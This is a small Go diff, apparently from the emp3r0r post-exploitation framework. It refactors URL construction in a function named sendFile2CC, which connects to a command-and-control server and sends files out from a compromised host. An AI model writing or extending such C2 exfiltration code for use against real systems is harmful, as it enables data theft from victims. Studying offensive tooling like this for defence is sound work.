@@ -146,7 +146,10 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 	}
 
 	// connect
-	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
+	url := fmt.Sprintf("%s%s/%s",
+		emp3r0r_data.CCAddress,
+		tun.FTPAPI,
+		token)
 	conn, _, _, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
